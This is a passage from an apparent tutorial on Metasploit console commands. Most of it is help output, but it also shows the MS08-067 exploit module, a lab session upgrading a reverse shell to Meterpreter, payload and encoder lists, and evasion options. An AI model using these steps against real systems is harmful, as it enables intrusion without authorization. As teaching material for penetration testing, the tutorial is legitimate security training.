</span><span class='line'>  Name     Current Setting  Required  Description
</span><span class='line'>  ----     ---------------  --------  -----------
</span><span class='line'>  RHOST                     yes       The target address
</span><span class='line'>  RPORT    445              yes       Set the SMB service port
</span><span class='line'>  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</span><span class='line'>
</span><span class='line'>Payload information:
</span><span class='line'>  Space: 410
</span><span class='line'>  Avoid: 8 characters
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  This module exploits a parsing flaw in the path canonicalization 
</span><span class='line'>  code of NetAPI32.dll through the Server Service. This module is 
</span><span class='line'>  capable of bypassing NX on some operating systems and service packs. 
</span><span class='line'>  The correct target must be used to prevent the Server Service (along 
</span><span class='line'>  with a dozen others in the same process) from crashing. Windows XP 
</span><span class='line'>  targets seem to handle multiple successful exploitation events, but 
</span><span class='line'>  2003 targets will often crash or hang on subsequent attempts. This 
</span><span class='line'>  is just the first version of this module, full support for NX bypass 
</span><span class='line'>  on 2003, along with other platforms, is still in development.
</span><span class='line'>
</span><span class='line'>References:
</span><span class='line'>  http://cvedetails.com/cve/2008-4250/
</span><span class='line'>  http://www.osvdb.org/49243
</span><span class='line'>  http://technet.microsoft.com/en-us/security/bulletin/MS08-067
</span><span class='line'>  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>jobs</strong> &ndash; check and interact with backgrounds jobs</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; jobs -h
</span><span class='line'>Usage: jobs [options]
</span><span class='line'>
</span><span class='line'>Active job manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -K        Terminate all running jobs.
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  Lists detailed information about a running job.
</span><span class='line'>    -k &lt;opt&gt;  Terminate jobs by job ID and/or range.
</span><span class='line'>    -l        List all running jobs.
</span><span class='line'>    -v        Print more detailed info.  Use with -i and -l</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>makerc</strong> &ndash; save the commands executed since startup to the specified file.</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; makerc demo.rc
</span><span class='line'>[*] Saving last 3 commands to demo.rc ...
</span><span class='line'>msf exploit(usermap_script) &gt; cat demo.rc
</span><span class='line'>[*] exec: cat demo.rc
</span><span class='line'>
</span><span class='line'>cat demo.rc
</span><span class='line'>clear
</span><span class='line'>sessions</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>options</strong> &ndash; displays the options of a module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help options
</span><span class='line'>Usage: options [mod1 mod2 ...]
</span><span class='line'>
</span><span class='line'>Queries the supplied module or modules for options. If no module is given,
</span><span class='line'>show options for the currently active module.
</span><span class='line'>
</span><span class='line'>msf &gt; options
</span><span class='line'>
</span><span class='line'>Global Options:
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>   Option            Current Setting    Description
</span><span class='line'>   ------            ---------------    -----------
</span><span class='line'>   ConsoleLogging    false              Log all console input and output
</span><span class='line'>   LogLevel          0                  Verbosity of logs (default 0, max 3)
</span><span class='line'>   MinimumRank       0                  The minimum rank of exploits that will run without explicit confirmation
</span><span class='line'>   Prompt            msf                The prompt string
</span><span class='line'>   PromptChar        &gt;                  The prompt character
</span><span class='line'>   PromptTimeFormat  %Y-%m-%d %H:%M:%S  Format for timestamp escapes in prompts
</span><span class='line'>   SessionLogging    false              Log all input and output for sessions
</span><span class='line'>   TimestampOutput   false              Prefix all console output with a timestamp</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>resource</strong> &ndash; runs the commands in a file</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(telnet_login) &gt; help resource
</span><span class='line'>Usage: resource path1 [path2 ...]
</span><span class='line'>
</span><span class='line'>Run the commands stored in the supplied files.  Resource files may also contain
</span><span class='line'>ruby code between &lt;ruby&gt;&lt;/ruby&gt; tags.
</span><span class='line'>
</span><span class='line'>See also: makerc</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>route</strong> &ndash; route traffic through a session</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(telnet_login) &gt; route -h
</span><span class='line'>Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]
</span><span class='line'>
</span><span class='line'>Route traffic destined to a given subnet through a supplied session.
</span><span class='line'>The default comm is Local.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>save</strong> &ndash; saves the current configuration</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help save
</span><span class='line'>Usage: save
</span><span class='line'>
</span><span class='line'>Save the active datastore contents to disk for automatic use across restarts of the console
</span><span class='line'>
</span><span class='line'>The configuration is stored in /root/.msf5/config</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>search</strong> &ndash; this is what you will use when searching for exploits</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help search
</span><span class='line'>Usage: search [keywords]
</span><span class='line'>
</span><span class='line'>Keywords:
</span><span class='line'>  app       :  Modules that are client or server attacks
</span><span class='line'>  author    :  Modules written by this author
</span><span class='line'>  bid       :  Modules with a matching Bugtraq ID
</span><span class='line'>  cve       :  Modules with a matching CVE ID
</span><span class='line'>  edb       :  Modules with a matching Exploit-DB ID
</span><span class='line'>  name      :  Modules with a matching descriptive name
</span><span class='line'>  osvdb     :  Modules with a matching OSVDB ID
</span><span class='line'>  platform  :  Modules affecting this platform
</span><span class='line'>  ref       :  Modules with a matching ref
</span><span class='line'>  type      :  Modules of a specific type (exploit, auxiliary, or post)
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  search cve:2009 type:exploit app:client
</span><span class='line'>
</span><span class='line'>msf &gt; search heartbleed
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                              Disclosure Date  Rank    Description
</span><span class='line'>   ----                                              ---------------  ----    -----------
</span><span class='line'>   auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Information Leak
</span><span class='line'>   auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Client Memory Exposure</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>sessions</strong> &ndash; interact with sessions</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; sessions -h
</span><span class='line'>Usage: sessions [options]
</span><span class='line'>
</span><span class='line'>Active session manipulation and interaction.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -K        Terminate all sessions
</span><span class='line'>    -c &lt;opt&gt;  Run a command on the session given with -i, or all
</span><span class='line'>    -h        Help banner
</span><span class='line'>    -i &lt;opt&gt;  Interact with the supplied session ID
</span><span class='line'>    -k &lt;opt&gt;  Terminate sessions by session ID and/or range
</span><span class='line'>    -l        List all active sessions
</span><span class='line'>    -q        Quiet mode
</span><span class='line'>    -r        Reset the ring buffer for the session given with -i, or all
</span><span class='line'>    -s &lt;opt&gt;  Run a script on the session given with -i, or all
</span><span class='line'>    -t &lt;opt&gt;  Set a response timeout (default: 15)
</span><span class='line'>    -u &lt;opt&gt;  Upgrade a shell to a meterpreter session on many platforms
</span><span class='line'>    -v        List verbose fields
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Many options allow specifying session ranges using commas and dashes.
</span><span class='line'>For example:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</span></code></pre></td></tr></table></div></figure>


<p>In the following example I am upgrading the shell of a session to Meterpreter:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; sessions
</span><span class='line'>
</span><span class='line'>Active sessions
</span><span class='line'>===============
</span><span class='line'>
</span><span class='line'>  Id  Type        Information  Connection
</span><span class='line'>  --  ----        -----------  ----------
</span><span class='line'>  1   shell unix               192.168.80.155:34501 -&gt; 192.168.80.156:4444 (192.168.80.156)
</span><span class='line'>
</span><span class='line'>msf exploit(usermap_script) &gt; sessions -u 1
</span><span class='line'>[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
</span><span class='line'>
</span><span class='line'>[*] Upgrading session ID: 1
</span><span class='line'>[*] Starting exploit/multi/handler
</span><span class='line'>[*] Started reverse TCP handler on 192.168.80.155:4433 
</span><span class='line'>[*] Starting the payload handler...
</span><span class='line'>[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
</span><span class='line'>[*] Sending stage (1495599 bytes) to 192.168.80.156
</span><span class='line'>[*] Command stager progress: 100.00% (668/668 bytes)
</span><span class='line'>msf exploit(usermap_script) &gt; [*] Meterpreter session 2 opened (192.168.80.155:4433 -&gt; 192.168.80.156:58435) at 2016-06-02 13:53:36 -0400</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>set</strong>, <strong>setg</strong> &ndash; sets value to option (g for global variables). You will do lots of setting as you tweak your exploits :p</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help set
</span><span class='line'>Usage: set [option] [value]
</span><span class='line'>
</span><span class='line'>Set the given option to value.  If value is omitted, print the current value.
</span><span class='line'>If both are omitted, print options that are currently set.
</span><span class='line'>
</span><span class='line'>If run from a module context, this will set the value in the module's
</span><span class='line'>datastore.  Use -g to operate on the global datastore
</span><span class='line'>
</span><span class='line'>msf &gt; setg
</span><span class='line'>
</span><span class='line'>Global
</span><span class='line'>======
</span><span class='line'>
</span><span class='line'>  Name   Value
</span><span class='line'>  ----   -----
</span><span class='line'>  RHOST  192.168.80.156</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>show</strong> &ndash; displays various information as needed</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help show
</span><span class='line'>[*] Valid parameters for the "show" command are: all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
</span><span class='line'>[*] Additional module-specific parameters are: missing, advanced, evasion, targets, actions</span></code></pre></td></tr></table></div></figure>


<p>The options that we need to edit when setting up exploits:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms08_067_netapi) &gt; show options
</span><span class='line'>
</span><span class='line'>Module options (exploit/windows/smb/ms08_067_netapi):
</span><span class='line'>
</span><span class='line'>   Name     Current Setting  Required  Description
</span><span class='line'>   ----     ---------------  --------  -----------
</span><span class='line'>   RHOST    192.168.80.156   yes       The target address
</span><span class='line'>   RPORT    445              yes       Set the SMB service port
</span><span class='line'>   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic Targeting</span></code></pre></td></tr></table></div></figure>


<p>A couple of payloads:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(ms08_067_netapi) &gt; show payloads
</span><span class='line'>
</span><span class='line'>Compatible Payloads
</span><span class='line'>===================
</span><span class='line'>
</span><span class='line'>   Name                                                Disclosure Date  Rank    Description
</span><span class='line'>   ----                                                ---------------  ----    -----------
</span><span class='line'>   generic/custom                                                       normal  Custom Payload
</span><span class='line'>   generic/debug_trap                                                   normal  Generic x86 Debug Trap
</span><span class='line'>   generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
</span><span class='line'>   generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
</span><span class='line'>   generic/tight_loop                                                   normal  Generic x86 Tight Loop
</span><span class='line'>   windows/adduser                                                      normal  Windows Execute net user /ADD
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Evasion</h3>

<p>For the evasion options available for each module, you can use the command <strong>show evasion</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(advantech_switch_bash_env_exec) &gt; show evasion
</span><span class='line'>
</span><span class='line'>Module evasion options:
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::header_folding
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enable folding of HTTP headers
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::method_random_case
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use random casing for the HTTP method
</span><span class='line'>
</span><span class='line'>   Name           : HTTP::method_random_invalid
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use a random invalid, HTTP method for request
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<h3>Encoders</h3>

<p>Metasploit automatically selects the best encoder for the job given the selected criteria. If you want to use a specific encoder, you can select one from the multitude available:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf payload(generic) &gt; show encoders
</span><span class='line'>
</span><span class='line'>Encoders
</span><span class='line'>========
</span><span class='line'>
</span><span class='line'>   Name                          Disclosure Date  Rank       Description
</span><span class='line'>   ----                          ---------------  ----       -----------
</span><span class='line'>   cmd/echo                                       good       Echo Command Encoder
</span><span class='line'>   cmd/generic_sh                                 manual     Generic Shell Variable Substitution Command Encoder
</span><span class='line'>   cmd/ifs                                        low        Generic ${IFS} Substitution Command Encoder
</span><span class='line'>   cmd/perl                                       normal     Perl Command Encoder
</span><span class='line'>   cmd/powershell_base64                          excellent  Powershell Base64 Command Encoder
</span><span class='line'>   cmd/printf_php_mq                              manual     printf(1) via PHP magic_quotes Utility Command Encoder
</span><span class='line'>   generic/eicar                                  manual     The EICAR Encoder
</span><span class='line'>   generic/none                                   normal     The "none" Encoder
</span><span class='line'>   mipsbe/byte_xori                               normal     Byte XORi Encoder
</span><span class='line'>   mipsbe/longxor                                 normal     XOR Encoder
</span><span class='line'>   mipsle/byte_xori                               normal     Byte XORi Encoder
</span><span class='line'>   mipsle/longxor                                 normal     XOR Encoder
</span><span class='line'>   php/base64                                     great      PHP Base64 Encoder
</span><span class='line'>   ppc/longxor                                    normal     PPC LongXOR Encoder
</span><span class='line'>   ppc/longxor_tag                                normal     PPC LongXOR Encoder
</span><span class='line'>   sparc/longxor_tag                              normal     SPARC DWORD XOR Encoder
</span><span class='line'>   x64/xor                                        normal     XOR Encoder
</span><span class='line'>   x86/add_sub                                    manual     Add/Sub Encoder
</span><span class='line'>   x86/alpha_mixed                                low        Alpha2 Alphanumeric Mixedcase Encoder
</span><span class='line'>   x86/alpha_upper                                low        Alpha2 Alphanumeric Uppercase Encoder
</span><span class='line'>   x86/avoid_underscore_tolower                   manual     Avoid underscore/tolower
</span><span class='line'>   x86/avoid_utf8_tolower                         manual     Avoid UTF8/tolower
</span><span class='line'>   x86/bloxor                                     manual     BloXor - A Metamorphic Block Based XOR Encoder
</span><span class='line'>   x86/call4_dword_xor                            normal     Call+4 Dword XOR Encoder
</span><span class='line'>   x86/context_cpuid                              manual     CPUID-based Context Keyed Payload Encoder
</span><span class='line'>   x86/context_stat                               manual     stat(2)-based Context Keyed Payload Encoder
</span><span class='line'>   x86/context_time                               manual     time(2)-based Context Keyed Payload Encoder
</span><span class='line'>   x86/countdown                                  normal     Single-byte XOR Countdown Encoder
</span><span class='line'>   x86/fnstenv_mov                                normal     Variable-length Fnstenv/mov Dword XOR Encoder
</span><span class='line'>   x86/jmp_call_additive                          normal     Jump/Call XOR Additive Feedback Encoder
</span><span class='line'>   x86/nonalpha                                   low        Non-Alpha Encoder
</span><span class='line'>   x86/nonupper                                   low        Non-Upper Encoder
</span><span class='line'>   x86/opt_sub                                    manual     Sub Encoder (optimised)
</span><span class='line'>   x86/shikata_ga_nai                             excellent  Polymorphic XOR Additive Feedback Encoder
</span><span class='line'>   x86/single_static_bit                          manual     Single Static Bit
</span><span class='line'>   x86/unicode_mixed                              manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
</span><span class='line'>   x86/unicode_upper                              manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</span></code></pre></td></tr></table></div></figure>


<p></p>

<ul>
<li><strong>spool</strong> &ndash; write console log to a file</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help spool
</span><span class='line'>Usage: spool &lt;off&gt;|&lt;filename&gt;
</span><span class='line'>
</span><span class='line'>Example:
</span><span class='line'>  spool /tmp/console.log</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>use</strong> &ndash; selects module</li>
</ul>


<h1>Payload types</h1>

<p>There are 3 types of payloads that you can use with your exploits.</p>

<ul>
<li><p><strong>singles</strong> are standalone payloads that have everything needed to run by themselves. They are reliable but their size might be a detriment with some exploits</p></li>
<li><p><strong>stagers</strong> are small and are designed to establish a connection between attacker and victim and download additional components for the exploit as needed</p></li>
<li><p><strong>stages</strong> have various functionalities and are downloaded by the stagers to be run on the remote host</p></li>
</ul>


<h2>Payload generation</h2>

<p>The following are the available options for generating payloads:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sf payload(generic) &gt; generate -h
</span><span class='line'>Usage: generate [options]
</span><span class='line'>
</span><span class='line'>Generates a payload.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -E        Force encoding.
</span><span class='line'>    -b &lt;opt&gt;  The list of characters to avoid: '\x00\xff'
</span><span class='line'>    -e &lt;opt&gt;  The name of the encoder module to use.
</span><span class='line'>    -f &lt;opt&gt;  The output file name (otherwise stdout)
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  the number of encoding iterations.
</span><span class='line'>    -k        Keep the template executable functional
</span><span class='line'>    -o &lt;opt&gt;  A comma separated list of options in VAR=VAL format.
</span><span class='line'>    -p &lt;opt&gt;  The Platform for output.
</span><span class='line'>    -s &lt;opt&gt;  NOP sled length.
</span><span class='line'>    -t &lt;opt&gt;  The output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-net,psh-reflection,psh-cmd,vba,vba-exe,vba-psh,vbs,war
</span><span class='line'>    -x &lt;opt&gt;  The executable template to use</span></code></pre></td></tr></table></div></figure>


<h1>Working with the database</h1>

<p>Metasploit is backed by a powerful database that you can use to organize and classify the information. First, you have to start the PostgreSQL server: <code>service postgresql start</code>. Then you create and initialize the database after starting Metasploit with the <code>msfdb init</code> command.</p>

<p>Let&rsquo;s look at the database commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Database Backend Commands
</span><span class='line'>=========================
</span><span class='line'>
</span><span class='line'>    Command           Description
</span><span class='line'>    -------           -----------
</span><span class='line'>    creds             List all credentials in the database
</span><span class='line'>    db_connect        Connect to an existing database
</span><span class='line'>    db_disconnect     Disconnect from the current database instance
</span><span class='line'>    db_export         Export a file containing the contents of the database
</span><span class='line'>    db_import         Import a scan result file (filetype will be auto-detected)
</span><span class='line'>    db_nmap           Executes nmap and records the output automatically
</span><span class='line'>    db_rebuild_cache  Rebuilds the database-stored module cache
</span><span class='line'>    db_status         Show the current database status
</span><span class='line'>    hosts             List all hosts in the database
</span><span class='line'>    loot              List all loot in the database
</span><span class='line'>    notes             List all notes in the database
</span><span class='line'>    services          List all services in the database
</span><span class='line'>    vulns             List all vulnerabilities in the database
</span><span class='line'>    workspace         Switch between database workspaces</span></code></pre></td></tr></table></div></figure>


<p>Chances are, you will want to keep your targets organized and separate from each other. For this, you can build different workspaces for every one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
